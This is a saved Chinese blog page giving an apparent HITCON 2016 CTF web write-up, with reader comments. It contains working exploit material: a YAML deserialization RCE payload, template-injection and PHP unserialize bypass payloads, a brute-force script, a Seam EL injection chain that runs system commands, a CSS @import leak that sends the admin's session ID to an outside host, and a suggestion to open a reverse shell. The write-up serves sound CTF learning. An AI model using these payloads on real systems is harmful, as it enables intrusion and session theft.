<!DOCTYPE html>

<html class="no-js" lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/11" rel="profile"/>
<link href="http://www.melodia.pw/xmlrpc.php" rel="pingback"/>
<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<title>HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙</title>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/s.w.org" rel="dns-prefetch">
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/feed=rss2" rel="alternate" title="Melody有奥妙 » Feed" type="application/rss+xml">
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/feed=comments-rss2" rel="alternate" title="Melody有奥妙 » 评论Feed" type="application/rss+xml"/>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/feed=rss2&amp;p=743" rel="alternate" title="Melody有奥妙 » HITCON 2016 WEB WRITEUP[2016.10.12已更新web500]评论Feed" type="application/rss+xml"/>
<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.melodia.pw\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.5"}};
			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/genericons.cssver=3.4.1" id="genericons-css" media="all" rel="stylesheet" type="text/css"/>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/style.cssver=4.7.5" id="twentysixteen-style-css" media="all" rel="stylesheet" type="text/css"/>
<!--[if lt IE 10]>
<link rel='stylesheet' id='twentysixteen-ie-css'  href='http://www.melodia.pw/wp-content/themes/twentysixteen/css/ie.css?ver=20160816' type='text/css' media='all' />
<![endif]-->
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentysixteen-ie8-css'  href='http://www.melodia.pw/wp-content/themes/twentysixteen/css/ie8.css?ver=20160816' type='text/css' media='all' />
<![endif]-->
<!--[if lt IE 8]>
<link rel='stylesheet' id='twentysixteen-ie7-css'  href='http://www.melodia.pw/wp-content/themes/twentysixteen/css/ie7.css?ver=20160816' type='text/css' media='all' />
<![endif]-->
<!--[if lt IE 9]>
<script type='text/javascript' src='http://www.melodia.pw/wp-content/themes/twentysixteen/js/html5.js?ver=3.7.3'></script>
<![endif]-->
<script src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/jquery.jsver=1.12.4" type="text/javascript"></script>
<script src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/jquery-migrate.min.jsver=1.4.1" type="text/javascript"></script>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/rest_route=" rel="https://api.w.org/"/>
<link href="http://www.melodia.pw/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/p=730" rel="prev" title="LCTF 2016 WEB Writeup"/>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/p=771" rel="next" title="Boston Key Party 2017 writeup"/>
<meta content="WordPress 4.7.5" name="generator">
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/p=743" rel="canonical"/>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/p=743" rel="shortlink"/>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fwww.melodia.pw%2F%3Fp%3D743" rel="alternate" type="application/json+oembed"/>
<link href="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fwww.melodia.pw%2F%3Fp%3D743&amp;format=xml" rel="alternate" type="text/xml+oembed"/>
<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
</meta></link></link></head>
<body class="post-template-default single single-post postid-743 single-format-standard">
<div class="site" id="page">
<div class="site-inner">
<a class="skip-link screen-reader-text" href="#content">跳至内容</a>
<header class="site-header" id="masthead" role="banner">
<div class="site-header-main">
<div class="site-branding">
<p class="site-title"><a href="http://www.melodia.pw/" rel="home">Melody有奥妙</a></p>
<p class="site-description">Keep thinking, sometimes naive.</p>
</div><!-- .site-branding -->
<button class="menu-toggle" id="menu-toggle">菜单</button>
<div class="site-header-menu" id="site-header-menu">
<nav aria-label="主菜单" class="main-navigation" id="site-navigation" role="navigation">
<div class="menu-%e9%a1%b5%e9%9d%a2-container"><ul class="primary-menu" id="menu-%e9%a1%b5%e9%9d%a2"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-688" id="menu-item-688"><a href="http://www.melodia.pw/?page_id=5">About</a></li>
</ul></div> </nav><!-- .main-navigation -->
</div><!-- .site-header-menu -->
</div><!-- .site-header-main -->
</header><!-- .site-header -->
<div class="site-content" id="content">
<div class="content-area" id="primary">
<main class="site-main" id="main" role="main">
<article class="post-743 post type-post status-publish format-standard hentry category-2" id="post-743">
<header class="entry-header">
<h1 class="entry-title">HITCON 2016 WEB WRITEUP[2016.10.12已更新web500]</h1> </header><!-- .entry-header -->
<div class="entry-content">
<h1>HITCON 2016 WEB writeup</h1>
<h2>Are you rich &amp;&amp; Are you rich2</h2>
<p>这道题有两种解法，在token那里存在注入，可以注入得到flag，或者上网找一个大富豪的bitcoin账号，然后直接填进去就行了，这样两道题都能解出来。</p>
<h2>Secure Posts</h2>
<p>模板注入，{{config}}，填到author那里即可。<br/>
Config {‘PREFERRED_URL_SCHEME’: ‘http’, ‘DEBUG’: False, ‘JSON_AS_ASCII’: True, ‘PROPAGATE_EXCEPTIONS’: None, ‘SESSION_COOKIE_SECURE’: False, ‘SESSION_COOKIE_NAME’: ‘session’, ‘APPLICATION_ROOT’: None, ‘SESSION_COOKIE_HTTPONLY’: True, ‘PRESERVE_CONTEXT_ON_EXCEPTION’: None, ‘TRAP_HTTP_EXCEPTIONS’: False, ‘TESTING’: False, ‘SECRET_KEY’: ‘hitcon{&gt;_&lt;—Do-you-know-script alert(1) /script-is-very-fun?}’, ‘SERVER_NAME’: None, ‘MAX_CONTENT_LENGTH’: None, ‘SESSION_COOKIE_DOMAIN’: None, ‘JSONIFY_PRETTYPRINT_REGULAR’: True, ‘SEND_FILE_MAX_AGE_DEFAULT’: 43200, ‘TRAP_BAD_REQUEST_ERRORS’: False, ‘LOGGER_NAME’: ‘post_manager’, ‘USE_X_SENDFILE’: False, ‘SESSION_COOKIE_PATH’: None, ‘PERMANENT_SESSION_LIFETIME’: datetime.timedelta(31), ‘JSON_SORT_KEYS’: True}&gt;</p>
<p>拿到第一个flag 同时也是第二题要用到的key</p>
<h2>Secure Posts 2</h2>
<p>yaml rce</p>
<p>exp:</p>
<pre><code>from flask import Flask


#init app
app = Flask(__name__)
app.secret_key = 'hitcon{&gt;_&lt;---Do-you-know- script alert(1) /script -is-very-fun?}'
accept_datatype = ['json', 'yaml']

default_datatype = 'yaml'
default_data = 
"""- {author: admin, content: You can store any posts here. All posts will not be stored
    at the server side., date: 'October 08, 2016 02:00:00', title: Welcome!}
- content: !!python/object/apply:subprocess.check_output
       args: [ cat flag2 ]
       kwds: { shell: true }
  author: ''
  date: ''
  title: ''
"""

from flask import Response
from flask import request, session
from flask import redirect, url_for, safe_join, abort
from flask import render_template_string, jsonify

#load utils
def load_eval(data):
    return eval(data)

def load_pickle(data):
    import pickle
    return pickle.loads(data)

def load_json(data):
    import json
    return json.loads(data)

def load_yaml(data):
    import yaml
    return yaml.load(data)

#dump utils
def dump_eval(data):
    return repr(data)

def dump_pickle(data):
    import pickle
    return pickle.dumps(data)

def dump_json(data):
    import json
    return json.dumps(data)

def dump_yaml(data):
    import yaml
    return yaml.dump(data)


def render_template(filename, **args):
    with open(safe_join(app.template_folder, filename)) as f:
        template = f.read()
        name = session.get('name', 'anonymous')[:10]
        return render_template_string(template.format(name=name), **args)

def load_posts():
    handlers = {
        # disabled insecure data type
        #"eval": load_eval,
        #"pickle": load_pickle,

        "json": load_json,
        "yaml": load_yaml
    }

    datatype = session.get("post_type", default_datatype)
    data = session.get("post_data", default_data)

    if datatype not in handlers: abort(403)
    return handlers[datatype](data)

def store_posts(posts, datatype):
    handlers = {
        "eval": dump_eval,
        "pickle": dump_pickle,

        "json": dump_json,
        "yaml": dump_yaml
    }
    if datatype not in handlers: abort(403)
    data = handlers\[datatype](posts)

    session["post_type"] = datatype
    session["post_data"] = data


@app.route('/store')
def store():
    session['post_type'] = 'yaml'
    session['post_data'] = default_data
    return 'fuck'


@app.route('/')
def index():
    posts = load_posts()
    #store_posts(posts, 'yaml')
    return str(posts)

@app.route('/post', methods=['POST'])
def add_post():
    posts = load_posts()

    title = request.form.get('title', 'empty')
    content = request.form.get('content', 'empty')
    datatype = request.form.get('datatype', 'json')
    if datatype not in accept_datatype: abort(403)
    name = request.form.get('author', 'anonymous')[:10]

    from datetime import datetime
    posts.append({
        'title': title,
        'author': name,
        'content': content,
        'date': datetime.now().strftime("%B %d, %Y %X")
    })
    session["name"] = name
    store_posts(posts, datatype)
    return redirect(url_for('index'))

@app.route('/source')
def get_source():
    with open(__file__, "r") as f:
        resp = f.read()
    return Response(resp, mimetype="text/plain")

app.run()

</code></pre>
<p>本地运行然后cookie打过去即可。</p>
<h2>%%%</h2>
<p>https证书，可以看到绑定的域名，host改成这个域名即可，访问得到flag</p>
<h2>Baby Trick</h2>
<p>首先是前一阵的cve，成员属性数目大于实际数目时可绕过wakeup方法，这样show方法中就可以注入了。</p>
<p>但是login过滤了orange，只有两个用户，而orange是唯一的管理员。</p>
<p>后来想到了，这里使用的是utf-8编码，sql中utf-8是有缺陷的，比如我可以用Ą，这样就可以绕过strtolower，然后也同时绕过了后面$username == ‘orange’ || stripos($sql, ‘orange’) != false的判断<br/>
最后payload如下</p>
<p>$args[‘username’] = ‘ORĄNGE’;<br/>
$args[‘password’] = ‘babytrick1234’;<br/>
$data = new HITCON(“login”,$args);<br/>
print urlencode(serialize($data));</p>
<p>修改成员数目为一个比较大的值。得到flag。</p>
<h2>Leaking</h2>
<p>先看下对象中有啥方法var j;for(i in this){j+=i;}j</p>
<p>可以发现有一个buffer方法，最后遍历buffer(1)—buffer(200)即可得到flag</p>
<h2>Angry Boy</h2>
<p>得到了一个混淆过的 class文件，解密后大致逻辑是aes加密，key是md5(ip+secret)，而每一位都可以爆破，就是爆破难度越来越高。<br/>
最终的爆破脚本</p>
<pre><code>import itertools
import hashlib
import sys
import requests

dic = "0123465789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*()_+|"

url = "http://52.196.144.8:8080/"
answer = ''
for i in range(0,16):
    for j in range(0,255):
        get = requests.session()
        index = get.get(url)

        string_prefix = index.content[index.content.find('md5( "')+6:index.content.find('md5( "')+22]

        if i &gt;= 0 and i &lt;= 3:
            md5_prefix = "333"
        elif i &gt;= 4 and i &lt;= 7:
            md5_prefix = "4444"
        elif i &gt;= 8 and i &lt;= 11:
            md5_prefix = "55555"
        elif i &gt;= 12 and i&lt;= 15:
            md5_prefix = "666666"

        for key in itertools.product(dic,repeat=10):  
            s = hashlib.md5(string_prefix+''.join(key)).hexdigest()
            if s[0:len(md5_prefix)] == md5_prefix :
                break

        data = {'guess':chr(j), 'captcha':''.join(key), 'line':i}
        get_answer = get.post(url,data=data)
        if get_answer.content.find("good") != -1:
            answer += chr(j)
            print j
            break

</code></pre>
<p>得到secret后发现解开是乱码。这时候hint给了平台版本。改成那个版本去解密就没问题了，原因不明。。</p>
<h2>Angry Seam</h2>
<p>要到了答案。。求大佬指点</p>
<pre><code>核心概念為在 Seam Framework 中有個內建參數為 actionOutcome，原本的作用在於頁面的導向，在 CVE-2010-1871 中曾經被找出參數內容會被 JBoss EL 解析，導致遠端代碼執行，在修復後禁止了 “#” 以及 “{” 出現，但原本的頁面導向功能還是存在，所以本來的概念是透過回報網址的功能促使管理員訪問

/angryseam/report.seam?actionOutcom&gt;e=/profile.seam?username=ggininder
由於參數會先進行 XSS 的過濾，actionOutcom&gt;e 會變成 actionOutcome 並帶入到 /angryseam/css.seam?actionOutcome=/profile.seam?username=ggininder 中，可導致管理員將 /profile.seam?username=ggininder 當成 CSS 載入

這時，在自身的 profile 中將名稱設置為

{/*';*/}%0a@import'http://orange.tw/?
可透過未閉合的單引號將部分 HTML 洩漏出來，而剛好 SESSIONID 就在其中取得管理員的身分取得 Flag !

不過在比賽途中出現了意外解XD 過程利用到了一個 Seam 的特性!

在之前對原代碼分析的時候其實找到了三個問題，其中一個是在 actionMethod 上的遠端任意代碼執行，不過這個漏洞的利用條件有點嚴苛，必須要在 Web Context 中有個可控檔案，可控檔案內容放置 “#{EL_HERE}” 接著就可以利用

/foo.seam?actionMethod:upload/1.gif:EL_HERE
的方式執行任意 EL 代碼!

由於這個漏洞需要有前置條件，所以官方也認為不是一個很高風險的漏洞!

不過這個漏洞還有一個下文，如果你無法控制可控檔案，但可控制現有檔案 EL 執行後的執行結果，Seam Framework 會對執行結果再進行一次 EL 解析。詳細代碼可研究 org.jboss.seam.navigation.Page 中 callAction 這個方法

因此整個攻擊流程是:

註冊一個使用者，將自身敘述設置成

/?x=#{expressions.instance().createValueExpression(request.getHeader('cmd')).getValue()}
訪問

/angryseam/template.seam?actionMethod=template.xhtml:util.escape(sessionScope['user'].getDescription())

由於在 template.xhtml 中存在

&lt;script&gt;
    var NAME="#{util.escape(sessionScope['user'].getUsername())}";
    var SID="#{util.escape(cookie['JSESSIONID'].value)}";
    var DESC="#{util.escape(sessionScope['user'].getDescription())}";
&lt;/script&gt;


會將使用者的敘述從 SESSION 中取出，所以可以控制第一次 EL 的回傳結果導致第二次 EL 注入! 在訪問 template.seam 的同時順便將 Header 設置成

cmd: #{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),request.getHeader('ccc'))}
ccc: ls -alh
即可達成遠端代碼執行!
</code></pre>
<p>来解答几个可能存在疑惑的地方</p>
<p>1.为什么要在realname中用那段代码而不是desc？</p>
<p>因为这里realname会出现两次，一次在title一次在body，而这样import就会把后面的内容全都当作要请求的url，直到body中的下一个单引号。从而也就能泄露sid，而改desc的话import都没办法成功，因为两个单引号把import给当成字符串了。</p>
<p>2.rce的具体步骤</p>
<p>这个rce是没有回显的23333，所以你直接执行用python反弹shell就好了。最后用在源代码中看到的mysql密码直接查admin密码就行了。。不知道为啥查出来是admin，当时我还试过的。。</p>
</div><!-- .entry-content -->
<footer class="entry-footer">
<span class="byline"><span class="author vcard"><img alt="" class="avatar avatar-49 photo" height="49" src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/7edb2f4a0823cf89ed72b0f0a154c121s=49&amp;d=mm&amp;r=g" srcset="http://1.gravatar.com/avatar/7edb2f4a0823cf89ed72b0f0a154c121?s=98&amp;d=mm&amp;r=g 2x" width="49"/><span class="screen-reader-text">作者 </span> <a class="url fn n" href="http://www.melodia.pw/?author=1">Melody</a></span></span><span class="posted-on"><span class="screen-reader-text">发布于 </span><a href="http://www.melodia.pw/?p=743" rel="bookmark"><time class="entry-date published" datetime="2016-10-10T12:30:41+00:00">2016年10月10日</time><time class="updated" datetime="2017-03-03T11:34:16+00:00">2017年3月3日</time></a></span><span class="cat-links"><span class="screen-reader-text">分类 </span><a href="http://www.melodia.pw/?cat=2" rel="category">每刻，知识分享</a></span> </footer><!-- .entry-footer -->
</article><!-- #post-## -->
<div class="comments-area" id="comments">
<h2 class="comments-title">
			《HITCON 2016 WEB WRITEUP[2016.10.12已更新web500]》有10个想法		</h2>
<ol class="comment-list">
<li class="comment even thread-even depth-1 parent" id="comment-257301">
<article class="comment-body" id="div-comment-257301">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-42 photo" height="42" src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/bf58432148b643a8b4c41c3901b81d1bs=42&amp;d=mm&amp;r=g" srcset="http://2.gravatar.com/avatar/bf58432148b643a8b4c41c3901b81d1b?s=84&amp;d=mm&amp;r=g 2x" width="42"/> <b class="fn">test</b><span class="says">说道：</span> </div><!-- .comment-author -->
<div class="comment-metadata">
<a href="http://www.melodia.pw/?p=743#comment-257301">
<time datetime="2016-10-10T14:08:50+00:00">
								2016年10月10日 下午2:08							</time>
</a>
</div><!-- .comment-metadata -->
</footer><!-- .comment-meta -->
<div class="comment-content">
<p>这排版不忍直视</p>
<p>代码可以包在</p>
<p>“`<br/>
里面<br/>
“`</p>
</div><!-- .comment-content -->
<div class="reply"><a aria-label="回复给test" class="comment-reply-link" href="http://www.melodia.pw/?p=743&amp;replytocom=257301#respond" onclick='return addComment.moveForm( "div-comment-257301", "257301", "respond", "743" )' rel="nofollow">回复</a></div> </article><!-- .comment-body -->
<ol class="children">
<li class="comment byuser comment-author-melody bypostauthor odd alt depth-2" id="comment-257302">
<article class="comment-body" id="div-comment-257302">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-42 photo" height="42" src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/7edb2f4a0823cf89ed72b0f0a154c121s=42&amp;d=mm&amp;r=g" srcset="http://1.gravatar.com/avatar/7edb2f4a0823cf89ed72b0f0a154c121?s=84&amp;d=mm&amp;r=g 2x" width="42"/> <b class="fn">Melody</b><span class="says">说道：</span> </div><!-- .comment-author -->
<div class="comment-metadata">
<a href="http://www.melodia.pw/?p=743#comment-257302">
<time datetime="2016-10-10T17:21:13+00:00">
								2016年10月10日 下午5:21							</time>
</a>
</div><!-- .comment-metadata -->
</footer><!-- .comment-meta -->
<div class="comment-content">
<p>欸  这个markdown插件识别有点问题  中间的双引号竟然把“`给截断了。。那真是相当难看  我就改掉了</p>
</div><!-- .comment-content -->
<div class="reply"><a aria-label="回复给Melody" class="comment-reply-link" href="http://www.melodia.pw/?p=743&amp;replytocom=257302#respond" onclick='return addComment.moveForm( "div-comment-257302", "257302", "respond", "743" )' rel="nofollow">回复</a></div> </article><!-- .comment-body -->
</li><!-- #comment-## -->
<li class="comment byuser comment-author-melody bypostauthor even depth-2" id="comment-257303">
<article class="comment-body" id="div-comment-257303">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-42 photo" height="42" src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/7edb2f4a0823cf89ed72b0f0a154c121s=42&amp;d=mm&amp;r=g" srcset="http://1.gravatar.com/avatar/7edb2f4a0823cf89ed72b0f0a154c121?s=84&amp;d=mm&amp;r=g 2x" width="42"/> <b class="fn">Melody</b><span class="says">说道：</span> </div><!-- .comment-author -->
<div class="comment-metadata">
<a href="http://www.melodia.pw/?p=743#comment-257303">
<time datetime="2016-10-10T17:24:06+00:00">
								2016年10月10日 下午5:24							</time>
</a>
</div><!-- .comment-metadata -->
</footer><!-- .comment-meta -->
<div class="comment-content">
<p>有改了下。。现在能看了</p>
</div><!-- .comment-content -->
<div class="reply"><a aria-label="回复给Melody" class="comment-reply-link" href="http://www.melodia.pw/?p=743&amp;replytocom=257303#respond" onclick='return addComment.moveForm( "div-comment-257303", "257303", "respond", "743" )' rel="nofollow">回复</a></div> </article><!-- .comment-body -->
</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-257304">
<article class="comment-body" id="div-comment-257304">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-42 photo" height="42" src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/66f0d33711e334fc0a34693f5d0062c6s=42&amp;d=mm&amp;r=g" srcset="http://0.gravatar.com/avatar/66f0d33711e334fc0a34693f5d0062c6?s=84&amp;d=mm&amp;r=g 2x" width="42"/> <b class="fn">Aklis</b><span class="says">说道：</span> </div><!-- .comment-author -->
<div class="comment-metadata">
<a href="http://www.melodia.pw/?p=743#comment-257304">
<time datetime="2016-10-10T19:52:56+00:00">
								2016年10月10日 下午7:52							</time>
</a>
</div><!-- .comment-metadata -->
</footer><!-- .comment-meta -->
<div class="comment-content">
<p>学习一波 诶就是get 不到点 心痛</p>
</div><!-- .comment-content -->
<div class="reply"><a aria-label="回复给Aklis" class="comment-reply-link" href="http://www.melodia.pw/?p=743&amp;replytocom=257304#respond" onclick='return addComment.moveForm( "div-comment-257304", "257304", "respond", "743" )' rel="nofollow">回复</a></div> </article><!-- .comment-body -->
</li><!-- #comment-## -->
<li class="comment even thread-even depth-1" id="comment-257305">
<article class="comment-body" id="div-comment-257305">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-42 photo" height="42" src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/3feba7f825065f94a67acafb5185edc9s=42&amp;d=mm&amp;r=g" srcset="http://0.gravatar.com/avatar/3feba7f825065f94a67acafb5185edc9?s=84&amp;d=mm&amp;r=g 2x" width="42"/> <b class="fn">random</b><span class="says">说道：</span> </div><!-- .comment-author -->
<div class="comment-metadata">
<a href="http://www.melodia.pw/?p=743#comment-257305">
<time datetime="2016-10-11T08:12:00+00:00">
								2016年10月11日 上午8:12							</time>
</a>
</div><!-- .comment-metadata -->
</footer><!-- .comment-meta -->
<div class="comment-content">
<p><a href="http://blog.innerht.ml/rpo-gadgets/" rel="nofollow">http://blog.innerht.ml/rpo-gadgets/</a><br/>
挺有意思的，危害比较大的就是可以窃取到页面敏感信息。</p>
</div><!-- .comment-content -->
<div class="reply"><a aria-label="回复给random" class="comment-reply-link" href="http://www.melodia.pw/?p=743&amp;replytocom=257305#respond" onclick='return addComment.moveForm( "div-comment-257305", "257305", "respond", "743" )' rel="nofollow">回复</a></div> </article><!-- .comment-body -->
</li><!-- #comment-## -->
<li class="comment odd alt thread-odd thread-alt depth-1 parent" id="comment-257306">
<article class="comment-body" id="div-comment-257306">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-42 photo" height="42" src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/3bf1106306866e99dfc365a5211e7708s=42&amp;d=mm&amp;r=g" srcset="http://0.gravatar.com/avatar/3bf1106306866e99dfc365a5211e7708?s=84&amp;d=mm&amp;r=g 2x" width="42"/> <b class="fn">Klaus</b><span class="says">说道：</span> </div><!-- .comment-author -->
<div class="comment-metadata">
<a href="http://www.melodia.pw/?p=743#comment-257306">
<time datetime="2016-10-13T15:03:37+00:00">
								2016年10月13日 下午3:03							</time>
</a>
</div><!-- .comment-metadata -->
</footer><!-- .comment-meta -->
<div class="comment-content">
<p>dalao,我的sourcepost的cookie打过去以后是403啊   不知道大佬遇没遇到这种情况</p>
</div><!-- .comment-content -->
<div class="reply"><a aria-label="回复给Klaus" class="comment-reply-link" href="http://www.melodia.pw/?p=743&amp;replytocom=257306#respond" onclick='return addComment.moveForm( "div-comment-257306", "257306", "respond", "743" )' rel="nofollow">回复</a></div> </article><!-- .comment-body -->
<ol class="children">
<li class="comment byuser comment-author-melody bypostauthor even depth-2" id="comment-257307">
<article class="comment-body" id="div-comment-257307">
<footer class="comment-meta">
<div class="comment-author vcard">
<img alt="" class="avatar avatar-42 photo" height="42" src="./HITCON 2016 WEB WRITEUP[2016.10.12已更新web500] – Melody有奥妙/7edb2f4a0823cf89ed72b0f0a154c121s=42&amp;d=mm&amp;r=g" srcset="http://1.gravatar.com/avatar/7edb2f4a0823cf89ed72b0f0a154c121?s=84&amp;d=mm&amp;r=g 2x" width="42"/> <b class="fn">Melody</b><span class="says">说道：</span> </div><!-- .comment-author -->
<div class="comment-metadata">
<a href="http://www.melodia.pw/?p=743#comment-257307">
<time datetime="2016-10-14T13:22:44+00:00">
								2016年10月14日 下午1:22							</time>
</a>
</div><!-- .comment-metadata -->
</footer><!-- .comment-meta -->
<div class="comment-content">
<p>额，本地的代码是啥样的来个瞅瞅</p>
</div><!-- .comment-content -->
<div class="reply"><a aria-label="回复给Melody" class="comment-reply-link" href="http://www.melodia.pw/?p=743&amp;replytocom=257307#respond" onclick='return addComment.moveForm( "div-comment-257307", "257307", "respond", "743" )' rel="nofollow">回复</a></div> </article><!-- .comment-body -->
</li><!-- #comment-## -->
</ol><!-- .children -->
</li><!-- #comment-## -->
<li class="pingback odd alt thread-even depth-1" id="comment-257321">
<div class="comment-body">
				Pingback： <a class="url" href="http://www.hacker.vip/loudongyujing/209.html" rel="external nofollow">由HITCON 2016一道web聊一聊php反序列化漏洞 – | hacker.vip-黑客安全技术网 hacker.vip—中国领先的IT技术网站</a> </div>
</li><!-- #comment-## -->
<li class="pingback even thread-odd thread-alt depth-1" id="comment-257394">
<div class="comment-body">
				Pingback： <a class="url" href="http://www.cmd.la/ldyj/1729.html" rel="external nofollow">由HITCON 2016一道web聊一聊php反序列化漏洞 – | cmd安全技术网-CMD安全技术网 CMD.LA</a> </div>
</li><!-- #comment-## -->
<li class="pingback odd alt thread-even depth-1" id="comment-257395">
<div class="comment-body">
				Pingback： <a class="url" href="http://www.hacker.vip/loudongyujing/1676.html" rel="external nofollow">由HITCON 2016一道web聊一聊php反序列化漏洞 – | hacker安全技术网-黑客安全技术网 hacker.vip</a> </div>
</li><!-- #comment-## -->
</ol><!-- .comment-list -->
<div class="comment-respond" id="respond">
<h2 class="comment-reply-title" id="reply-title">发表评论 <small><a href="/?p=743#respond" id="cancel-comment-reply-link" rel="nofollow" style="display:none;">取消回复</a></small></h2> <form action="http://www.melodia.pw/wp-comments-post.php" class="comment-form" id="commentform" method="post" novalidate="">
<p class="comment-notes"><span id="email-notes">电子邮件地址不会被公开。</span> 必填项已用<span class="required">*</span>标注</p><p class="comment-form-comment"><label for="comment">评论</label> <textarea aria-required="true" cols="45" id="comment" maxlength="65525" name="comment" required="required" rows="8"></textarea></p><p class="comment-form-author"><label for="author">姓名 <span class="required">*</span></label> <input aria-required="true" id="author" maxlength="245" name="author" required="required" size="30" type="text" value=""/></p>
<p class="comment-form-email"><label for="email">电子邮件 <span class="required">*</span></label> <input aria-describedby="email-notes" aria-required="true" id="email" maxlength="100" name="email" required="required" size="30" type="email" value=""/></p>
<p class="comment-form-url"><label for="url">站点</label> <input id="url" maxlength="200" name="url" size="30" type="url" value=""/></p>
<p class="form-submit"><input class="submit" id="submit" name="submit" type="submit" value="发表评论"/> <input id="comment_post_ID" name="comment_post_ID" type="hidden" value="743"/>
<input id="comment_parent" name="comment_parent" type="hidden" value="0"/>
</p><p style="display: none;"><input id="akismet_comment_nonce" name="akismet_comment_nonce" type="hidden" value="06f4114586"/></p><p style="display: none;"><input id="ak_js" name="ak_js" type="hidden" value="195"/></p> </form>
</div><!-- #respond -->
